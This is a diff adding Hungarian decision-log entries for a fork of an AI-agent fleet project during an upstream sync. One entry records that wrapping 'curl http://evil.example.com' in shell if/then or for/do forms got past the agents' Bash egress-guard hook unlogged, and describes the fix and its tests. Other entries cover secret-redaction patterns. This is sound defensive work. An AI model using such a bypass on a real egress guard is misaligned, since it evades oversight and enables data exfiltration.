@@ -17712,6 +17712,245 @@ akkor módosít viselkedést, ha a lockfile eltér VAGY FLEET_TEST_TREE a fő kl
 kártyát (5d365589), backend2 reprodukálta VALÓDI `npm ci`-vel (nem csak a lelet szövegéből
 feltételezve) és implementálta mindhárom javítást. Gate: QA + Cybersec (WhiteHat).
 
+## 2026-10-09 -- Kartya 35dc6dbe (UPSTREAM-SYNC egress-klaszter): bash-egress-guard.py keyword-gap javitas
+
+Upstream 25-commites "Agent-scaffold + hookok + engedely-prompt" klaszterbol az Egress/security-hooks
+alklasztert (3 commit) ellenoriztem elsonek: 857eb2eb (feat, Bash-hook 3 named egress-alak tiltasa),
+59e6b839 (fix, PR-link/$-elrejtes alhamis-pozitiv), ba40bdc0 (feat, vendor-API host allowlist).
+
+**Dontes mindharomra: a fork sajat bash-egress-guard.py-ja (interpreter-agnosztikus, network-intent
+alapu, nem curl/wget-szoveg-mintaillesztes) mar lefedi/felulmulja mindharmat.** 857eb2eb+ba40bdc0:
+skip, elo repro-val igazolva (bare external curl, interpreter one-liner, valtozoban rejtett URL mind
+block; ba40bdc0-nal a fork mar egyseges store/bash-egress-allowlist.json-t hasznal, nincs kulon
+vendor-hosts fajl). 59e6b839: a konkret upstream-alhamis-pozitivok (PR-link payloadban, $ elrejti a
+hostot) nem reprodukalhatok (a fork architekturaja mar helyesen kulonbozteti a value-flag/target-flag-ot
+es fail-closed-ra teszi a $-expanziot) -- DE az ELLENORZES kozben UJ, valos rest talaltam a fork sajat
+kodjaban: a `then`/`do`/`else`/stb. shell-kulcsszavak nem voltak atugorva `_command_name`-ben, igy
+`if true; then curl http://evil.example.com; fi` es `for i in...; do curl http://evil.example.com; done`
+enforce modban exit 0-t adott, NULLA log-sorral (merve, elo repro, mindket alak). Javitva: `_SHELL_KEYWORDS`
+halmaz (if/then/elif/else/fi/do/done/while/until/case/esac/in/select/!) -- a `{`/`}` SZANDEKOSAN NEM
+kerult bele, mert azt mar a kulon `_find_function_bodies`/`_looks_network_capable` mechanizmus kezeli
+helyesen (a hatch-ellenorzes a TELJES parancs szegmensein fut, nem csak a brace-csoport szegmensen) --
+elso probalkozasom "{"/"}"-t is felvette, ez megbontotta a meglevo hatch-szimmetria-tesztet (duplikalt,
+nem-hatch-tudatos lelet ugyanarra a curl-ra), a selftest azonnal elkapta (132/134 -> javitva 135/135).
+2 uj selftest-eset (pre-fix piros, `git stash`-sel igazolva, csak ez a ket eset bukott), plusz egy
+localhost-kontroll ugyanabban az alakban (nem tul-tiltas). scripts/hooks/bash-egress-guard.py,
+scripts/hooks/bash-egress-guard.selftest.py.
+
+**Miert DECISIONS.md bejegyzes:** a 10. szabaly (GitHub-first/community-adopt) ertelmeben az
+adopt/adapt/skip dontes nem-trivialis ertekkel bir, es ez egy biztonsagi gate-erintesu fork-divergens
+javitas (ACL-bypass egy mar eleso biztonsagi kapuban, barhogy is log-only a shipping default).
+
+**Ki döntött:** backend (karpathy-guidelines, mutacio-proof teszt). Gate: QA + Cybersec (a kartya 35dc6dbe
+sajat kijelolese szerint, egress/hook-reteg biztonsagi hatasu).
+
+## 2026-10-09 -- Kartya 35dc6dbe folytatas: Hooks + Agent-core klaszter (13 commit) dontesei
+
+**Hooks klaszter (5 commit):** mind STALE/mar-adoptalt, nincs uj follow-up kartya.
+- 6febccdf (Stop guard csatorna-fuggetlen reply-tool-nev): PENDING -- a fork tenylegesen tobb-providert
+  tamogat (ChannelProviderType: telegram/slack/discord/googlechat/teams), de a ket Telegram-specifikus
+  hook (telegram-reply-directive.py, telegram-reply-guard.py) hardkodolt tool-nevet hasznal. A helyes
+  tool-nev minta a tobbi 4 providerre SEHOL nincs a repoban (grep-elve), es a live rendszeren is csak a
+  telegram plugin van telepitve -- a talalgatas rosszabb lenne a jelenlegi hardkodnal. Dontes-kor: live
+  plugin-hozzaferes vagy marketplace-definicio ellenorzese utan.
+- 11112a8a (memory-lookup-nudge): mar ADOPTED (acknowledged-conflicts.ts sora).
+- 89bc8417 (telegram-image-resize.sh torles): nincs mit torolni, a fajl mar nem letezik ebben a forkban.
+- 03255c1e + 0db7ac66 (permission-prompt-as-question + wiring-teszt): mar adoptalva kartya dbba0424-en
+  (done, PERMDENY905), grep-pel igazolva (channel-monitor.ts:2020, pane-permission-dialog.test.ts 14 eset).
+
+**Agent-core klaszter (8 commit):**
+- 51b18820 (generic custom model-provider): PORTED kozvetve -- kartya 96c00ee5 (done) mar epitette a
+  customProvider vegponti bekotest, a 965b0b2b (done) altal halasztott tetelkent.
+- 9ce20239 (PERSONANOCLOBBER923): PENDING, dedikalt kartya mar letezik: 28923621 (planned). Nem duplikalva.
+- f3ce19ed + 75be3249 (HOSTMOVE923, CLAUDE.md/PreCompact ujra-horgonyzas): PENDING, UJ follow-up kartya
+  nyitva: 8c6f30fb. A fork sajat CLAUDE.md-generalasahoz igazitando (sajat ANCHORED_SUFFIXES-lista kell,
+  nem upstream listajanak masolasa) -- mar egyszer deferalva 965b0b2b-n, most sajat kartyat kapott.
+- 1a10db2e (ZAKARFELUGY921, update-finalizer tulelje a stop.sh-t): PENDING, UJ follow-up kartya: 3caa7e9f.
+  A fork sajat acknowledged-conflicts.ts bejegyzese mar ezt nevezte meg "a legerosebb egyedi adopcios
+  jelolt"-nek egy korabbi korben, most sajat kartyat kapott (QA gate, restart/rollback megbizhatosag).
+- a7f809d5 (oauthTokenFile, ugynokenkenti sajat setup-token): PENDING, UJ follow-up kartya: 06b48bd0.
+  Nagy (214+384 sor upstream, tobb review-korrekcios kommit), credential-kezeles trust-boundary -- NEM
+  epitve ebben a mar is nagy sync-kartyaban, sajat Gate QA+Cybersec kartyan.
+- 39a7e2ab + 0fc7aee6 (MCPOROKLES923, uj ugynok MCP-oroklese csak explicit listarol): PENDING, UJ
+  follow-up kartya: 0c3c3796. Uj fajl (mcp-inheritance.ts) + tobb erintett fajl, trust-boundary
+  (MCP-szerver-kor-bovules), sajat Gate QA+Cybersec kartyan.
+
+**Miert nem epitve helyben:** a 4 uj follow-up kartya mindegyike tobb-szaz soros, tobb-reszes, valodi
+adoptacios dontest igenylo feature (nem mechanikus port), ketto trust-boundary-erintesu (SEC gate) --
+a mar is 31-commitos sync-kartyaba zsufolasuk a 10. szabaly (GitHub-first) sajat szellemevel menne
+szembe: minden adoptacios dontes a sajat sulyanak megfelelo helyen szulessen, kulon gate-tel ahol indokolt.
+
+**Ki döntött:** backend (karpathy-guidelines, grep-elso fegyelem minden tetelre). Gate: QA + Cybersec
+(a kartya 35dc6dbe sajat kijelolese szerint).
+
+## 2026-10-09 -- Kartya 35dc6dbe folytatas: copy-gate/homoglyph klaszter (15 commit) dontese + tool-log-capture.py javitas
+
+**13 commit (e4463c71, bdfb09d4, 7fdf853e, 068557b0, 6e4466f8, 3990020f, a3fdf85c, 6d7e7312, c9c9baa0,
+31c3f4be, babbc71a, 7c666ee0, 347df3d1) PENDING, nem duplikalva:** mind a `scripts/hooks/outgoing-copy-gate.py`
+fajlt erintik, ami MAR eszkalalva van a kartya 7e70144e-re (backend3, planned, GATENEVSTRIP921 miatt a
+09d54e88-bol, ket korabbi Cybersec NO-GO ugyanerre az osztalyra -- nevmaszkolas/accent-check interakcio).
+A fajl ACKNOWLEDGED_UPSTREAM_BLOBS pinje SZANDEKOSAN nincs frissitve, amig 7e70144e nem dont (cybersec GO
+komment a 09d54e88-n). Nem epitve itt, mar kiosztva sajat Cybersec-gates kartyan.
+
+**1 commit (4811efcb, TOOLLOGREDACT924) ADOPTALVA, FORK-SPECIFIKUSAN ADAPTALVA:** scripts/hooks/
+tool-log-capture.py sajat `_redact()` fuggvenye (KULONBOZIK upstream-etol, nem azonos mechanizmus) --
+elo teszteles 6 valos rest talalt, mind megerositve: (1) idezojeles ertek ("password=\"x\"") az eredeti
+mintaban a nyito idezojelnel megallt; (2) `MY_SECRET_KEY=...` tipusu *_KEY/*_SECRET/*_TOKEN/*_PASSWORD
+valtozonev nem illeszkedett (a label csak onallo szokent kerestetett); (3) URL-be agyazott jelszo
+(`user:pass@host`) egyaltalan nem volt lefedve; (4) szokoz-elvalasztott CLI-flag ertek (`--password x`,
+nincs =/: ) nem volt lefedve; (5) Basic auth-sema (csak bearer volt kezelve); (6) label nelkuli, csupasz
+JWT-alak (harom pont-elvalasztott base64url szegmens). Javitva: `_SECRET_PATTERNS` ujraepitve, mindegyik
+minta `val`/`val1`/`val2` elnevezett csoportot ad a tenylegesen redaktalando reszre (a tobbi -- label,
+elvalaszto, idezojel, URL user+@ -- valtozatlan marad), `_redact()` generikusan csak ezt a csoportot
+csereli. EGY ONKENT TALALT HIBA JAVITVA KOZBEN: a szokoz-CLI-flag mintat elsore `(?P<q>["\']?)` opcionalis
+idezojel-csoporttal probaltam, ami NEM-ILLESZKEDO (ures) csoportra hivatkozo visszautalast csinal --
+Python re-ben egy ures csoportra `(?!(?P=q))` mindig BUKIK (az ures minta mindig illeszkedik, a tagadas
+tehat mindig hamis), igy a teljes ag csendben kiesett. Kulon idezett/nem-idezett ALTERNATIVAKKA bontva
+(val1/val2), nem egy opcionalis csoporttal -- ugyanaz a csapda-osztaly, mint a bash-egress-guard.py-n
+korabban ma mar talalt "{"/"}" keyword-hiba (mindketto: egy regex-ag, ami csendben nem illeszkedik a
+helytelen feltetelezes miatt). Uj scripts/hooks/tool-log-capture.selftest.py (16 eset: 9 uj repro + 5
+pre-existing + 2 kontroll a tul-redaktalas ellen, pl. "this auth is broken today" NEM redaktalodik).
+Mutacio-proof: `git stash` a javitasra, pontosan a 9 uj eset bukott (a 7 regi/kontroll zold maradt),
+visszaallitva 16/16 zold.
+
+**Miert fork-specifikus adaptacio, nem upstream-port:** a fork sajat tool-log-capture.py-ja mar egyedi
+hiba-osztalyokat kezel (lasd a fajl sajat TOOLLOGVAKSIKER921 fejlece), a redact-regex is sajat
+mintakeszlet -- az upstream lecke (mely redaktalasi rest zar) alkalmazva lett a fork sajat kodjara,
+nem upstream kodja masolva at.
+
+**Ki döntött:** backend (karpathy-guidelines, elo repro + mutacio-proof). Gate: QA + Cybersec
+(credential-redaktalas biztonsagi kontroll, a kartya 35dc6dbe sajat kijelolese szerint).
+
+## 2026-10-09 -- Kartya 35dc6dbe: e116296e (TOOLLOGURLSCHEME924) kiegeszito javitas, 31/31 commit lezarva
+
+Kozvetlen folytatas az elozo bejegyzesnek: e116296e (upstream kovetkezo commitja ugyanarra a
+tool-log-capture.py _redact()-ra) 2 tovabbi, elo teszteles altal igazolt rest talalt a sajat frissen
+irt mintamban: (1) ures felhasznalonev (`redis://:pass@host`, a szokasos redis-URL-alak) nem illeszkedett,
+mert a felhasznalonev-osztaly `+` (legalabb 1 karakter) volt; (2) idezojelezetlen `@` a jelszoban
+(`postgres://user:pass@word@host`) csak az ELSO `@`-ig redaktalt, a jelszo maradek reszet ("word")
+szabadon hagyva. Javitva: felhasznalonev `*`-ra (nulla-vagy-tobb), jelszo lusta mintaval + lookahead,
+ami az UTOLSO `@`-ig fut a host elott. 3 uj teszt (2 valos repro, piros git stash-sel igazolva, + 1
+mongodb+srv kontroll ami mar az elozo korben is zold volt, nem uj regresszio).
+
+**Ezzel a kartya 35dc6dbe mind a 31 upstream commitja dontesre kerult**: 2 ADOPTED/PORTED kozvetlenul
+(51b18820 kartya 96c00ee5-n keresztul, e116296e+4811efcb helyben), 1 valodi javitas helyben
+(bash-egress-guard.py keyword-gap, lasd korabbi bejegyzes), 4 UJ follow-up kartya nyitva nagyobb,
+tobb-reszes tetelekre (8c6f30fb HOSTMOVE923, 3caa7e9f ZAKARFELUGY921, 06b48bd0 oauthTokenFile,
+0c3c3796 MCPOROKLES923), 1 meglevo kartyara hivatkozva (28923621 PERSONANOCLOBBER923), 13 mar
+eszkalalt kartyara hivatkozva (7e70144e, outgoing-copy-gate.py), 1 tovabb-nem-donthetove (6febccdf,
+hianyzo ellenorzesi adat a tobbi channel-providerre), a tobbi STALE/mar-megoldott.
+
+**Ki döntött:** backend (karpathy-guidelines). Gate: QA + Cybersec.
+
+## 2026-10-09 -- Upstream-sync 7. koteg (kartya 087e4418, Szotasz/marveen fcbe40fe..21bd018e)
+
+Minden fajlnev relativ a repo gyokerehez. Fork-oldal az alapertelmezes; csak az eltereseket
+sorolja fel ez a bejegyzes. 11 konfliktusos fajl + 1 modify/delete.
+
+**src/__tests__/context-guard-main-transcript-root.test.ts: UJRA torolve (modify/delete).**
+A teszt a batch 5-ben mar torolt src/web/main-transcript-root.ts-re tamaszkodik (import a
+140. soron). Ez a modul es a hozza tartozo GATEVAK917/mainConfigRoots-fuggo configDirFor-javitas
+mar korabban, TOBBSZOR, deliberate fork-dontessel elutasitva (lasd acknowledged-conflicts.ts,
+"supervised cutover, card 5c134edf"). Ellenorizve: context-restart-gate-runner.ts SAJAT,
+MEGLEVO configDirFor-ja UGYANEZT a mintat ("name === MAIN_AGENT_ID ? undefined : ...") hasznalja
+SZANDEKOSAN, nem hibabol -- ez NEM egy el nem vegzett javitas, hanem egy mar dokumentalt,
+tobbszor megerositett fork-dontes. A torles konzisztens ezzel.
+
+**scripts/hooks/outgoing-copy-gate.py: FRISS review a kartya explicit kerese szerint (korabbi
+Cybersec elutasitas miatt, 2 ACKNOWLEDGED allowlist: fbb36b41 round 7/8+11).** Upstream
+GATENEVSTRIP921 ujrastrukturalta a technikai maszkot (_TECH_COMMON/_TECH_SUFFIXED kettevalasztva,
+NAME_MASK a nev-szabalynak, TECHNICAL az ekezet-/token-vizsgalatnak) -- a szerkezet ATVETVE, DE a
+_TECH_SUFFIXED HAROM korabban elutasitott alesete (szam+toldalek, tulajdonnev+toldalek,
+kotojeles-kisbetus-azonosito) MEGINT NEM, mert FELTETEL NELKUL maszkol (csak most szukebb
+hatokorben, a nev-szabalyt mar nem erinti, de a token-/ekezet-vizsgalatot meg mindig). A
+"level 1" negyedik eset (valodi lyuk, sajat CLAUDE.md "Level 1/2/3" szohasznalata miatt)
+ATVEVE, mint korabban. A nev-kereses (_name_search, fork sajat wall-clock-koltsegkeretes
+ReDoS-vedelme) MEGMARADT, csak a maszkolt szovegen hivva (GATENEVSTRIP921 celjat szolgalva a
+fork sajat ReDoS-vedelmenek elvesztese nelkul). Ellenorzes: mind a 4 outgoing-copy-gate
+teszt-fajl + a selftest zold a feloldas utan.
+
+**src/web/agent-scaffold.ts: buildEvidenceBody megint a recipient-ledgerre hivatkozott
+(gateParagraphs, isMainAgent parameter).** Ugyanaz az ismetlodo minta, mint a 6. kotegben --
+upstream LEDGERFOAGENS922/GATESCOPE921 kore ujra a MAR visszavont ledger-rendszerre epitett
+(ez utal arra, hogy upstream ezt a funkciot SOK kommitban fejlesztette, es minden koteg uj
+hivatkozast hoz). Eltavolitva, buildEvidenceBody visszaallitva parameter nelkulire. A hozza
+tartozo teszt (agent-scaffold-evidence-rule.test.ts) upstream LEDGERFOAGENS922 describe-blokkja
+is toroltve (ellentmondott a MAR OTT LEVO, kodelv-12 sajat korabbi "does not claim" tesztnek --
+ket egymasnak ellentmondo teszt csendben egyutt elt a fajlban, mert textualisan nem fedtek at
+egymast).
+
+**src/web/token-usage.ts + docs/token-usage.md: TOKENVAK915 (mainConfigRoots-alapu fo-ugynok
+izolalt-gyoker felismeres) HARMADSZOR elutasitva, konzisztensen a mar harom korban (2026-09-05,
+2026-09-11, 2026-09-25) rogzitett dontessel -- lasd acknowledged-conflicts.ts sajat bejegyzese.
+Ugyanez az encodeProjectPath/encodeClaudeProjectDir dedup (kozomegyeg funkcionalisan, csak
+"nem urgent" miatt halasztott) is kimaradt -- a sajat lokalis fuggveny visszaallitva. A hozza
+tartozo UJ upstream tesztfajl (token-usage-main-isolated-root.test.ts) egeszeben a NEM ATVETT
+funkciot tesztelte, torolve.
+
+**package.json/package-lock.json: a dependency-lista fork-kanonikus marad (acknowledged-conflicts.ts
+sajat szabalya, 2026-08-20), csak a verzio-mezo (upstream X.Y.Z-t koveti, +mikrob.N sajat szamlalo)
+es az UJ, additiv script-bejegyzesek (skill, browser-verify, start:crm -- a CRM-modulhoz es a
+scripts/skill.ts-hez, mindkettohoz letezo fajl) kerultek at. A lockfile a fork SAJAT (mar helyes)
+verzioja maradt -- upstream lockfile-ja NEM egyezett a fork package.json-javal (vitest@2 vs @4,
+better-sqlite3@11 vs @13 -- mindegyik korabban mar case-by-case elutasitott bump).
+
+**src/__tests__/prompt-injection-defense.test.ts: upstream kiszervezte importsValueBinding-et
+egy kozos helperbe (./setup/source-imports.js, TESZTIMPORTUTIL922) -- ATVEVE, a fork sajat
+lokalis masolata torolve (duplikalt deklaracio lett volna).**
+
+**Egyeb genuin union/additiv pontok:** src/web/agent-process.ts (EPERM /tmp-fallback uj funkcio,
+mkdtempSync/encodeClaudeProjectDir/buildLaunchCmd fuggvenyesitve -- a fork sajat feedbackSurveyEnv
+megtartva a kombinalt launch parancsban); src/web/active-model.ts (tiszta kommentbovites);
+src/web/channel-poller-reap.ts tesztjei (ket fuggetlen leiro-blokk egyesitve: fork sajat
+isPollerArgv/filterPollerPids + upstream uj foreign-main-poller-reaper tesztkore); update.sh
+(ket azonos "git switch main" javitas megtartva a fork oldalan; a POST_MERGE_MODE wrapper
+megtartva, benne upstream uj UPDATE_AUTO_REBASE opcionalis funkcioja -- alapertelmezes szerint
+KI, csak explicit UPDATE_AUTO_REBASE=1-re).
+
+**Ki döntött:** backend3 (konfliktusfeloldas, 1 modify/delete konzisztens korabbi dontessel
+fenntartva, TOKENVAK915 harmadszor elutasitva a mar rogzitett szabaly szerint, outgoing-copy-gate.py
+friss review a kartya explicit kerese szerint -- 3 korabban elutasitott aleset ismet elutasitva,
+1 valodi lyuk atvetve). Gate: QA + Cybersec + Cybered (a kartya kerese szerint).
+
+## 2026-10-09 -- Kartya 8c6f30fb (HOSTMOVE923): sajat ensureProjectRootAnchor, nem upstream suffix-listaja
+
+Folytatasa a 35dc6dbe-n (fentebb) nyitott follow-up kartyanak. Felterkepeztem a fork sajat
+generalt tartalmat: generateClaudeMd() (agent-scaffold.ts) LLM-generalt szabadszoveges CLAUDE.md-t
+ir AGENT LETREHOZASAKOR (a Memoria/Kanban/Autonomia recept-blokkok literalis `${PROJECT_ROOT}`
+utvonalakkal), es a settings.json PreCompact/SessionStart hook-jai templates/settings.json.template-bol
+`{{PROJECT_ROOT}}` placeholder-rel egyszer kerulnek bele ("Only if the file doesn't exist yet" --
+sosem ujra-oldodik fel). Host-move utan (uj gep, uj PROJECT_ROOT) MINDKET fajl orokre a HALOTT
+regi utvonalat nevezi, amig valaki kezzel at nem irja.
+
+Upstream sajat mechanizmusa (f3ce19ed) egy INSTALL_ANCHORED_SUFFIXES listaval dolgozik (upstream
+SAJAT generalt-tartalom alakja: store/.dashboard-token, scripts/hooks/, stb.) -- ezt mar 965b0b2b-n
+elhalasztottam, mert ez a fork mas tartalmat general, es a CLAUDE.md test szabad szoveg, nem
+veges recept-lista: egy suffix-lista soha nem lenne kimerito ra.
+
+EHELYETT: egy per-agent anchor-fajl (`agents/<nev>/.claude/project-root-anchor.json`) jegyzi meg,
+melyik PROJECT_ROOT volt elo legutobb, amikor `ensureProjectRootAnchor(name)` lefutott az
+agensre. Ha a jelenlegi PROJECT_ROOT elter a rogzitettol, host-move tortent -- a CLAUDE.md es a
+settings.json teljes tartalmaban minden literalis elofordulasat a REGI gyoknek egyszeru substring-
+replace-eli az UJ gyokerre (biztonsagos: mindketto abszolut fajlrendszer-utvonal, a regi string nem
+jelenhet meg legitim modon mashogy), majd az anchor frissul. Nincs szukseg suffix-enumeraciora, es
+a mechanizmus a szabad szoveget is lefedi, nem csak fix recepteket. A fo agens KIHAGYVA (CLAUDE.md
+es settings.json is git-tracked ott, ugyanaz a dontes mint ensureFleetAuthSection-nel, kartya
+2dd28b5d/99fccbcf).
+
+Bekotve: `scaffold-section-sweeper.ts` (periodikus sweep, 15 percenkent, minden futo sub-agensre) ES
+`agent-process.ts` startAgentProcess (agens-inditaskor azonnal) -- igy a "minden bootkor ujra-
+horgonyoz" upstream-elv teljesul, periodikus sweeppel kiegeszitve a hosszu eletu, ritkan ujrainditott
+agensekre (ugyanaz az indok mint scaffold-section-sweeper.ts sajat GAP-magyarazata).
+
+Teszt: `project-root-anchor.test.ts` (4 eset: baseline-iras rewrite nelkul, no-op ha nincs drift,
+teljes re-anchor CLAUDE.md+settings.json-ra host-move szimulacioval, fo-agens no-op). Mutacio-proof:
+`git stash` az agent-scaffold.ts valtozason -> typecheck 3 db TS2339/TS2305 hibat ad (hianyzo export),
+visszaallitva zold. `npm run typecheck` tiszta, `src/__tests__/scaffold-section-sweeper.test.ts` (7),
+`agent-scaffold-main-claude-md-zero-diff.test.ts` (5) es `shebang-files-executable.test.ts` (3)
+regresszio nelkul zold.
+
+**Ki döntött:** backend (karpathy-guidelines). Gate: QA (infra/host-move megbizhatosag, nincs uj
+trust-boundary, a kartya sajat kerese szerint).
 ## 2026-10-09 -- Csatorna-infra megbízhatósági felvétel: 19 upstream commit (kártya fd10c70b)
 
 A kártya 19 upstream commitot sorolt fel a channel-monitor/poller/voice/sms/slack
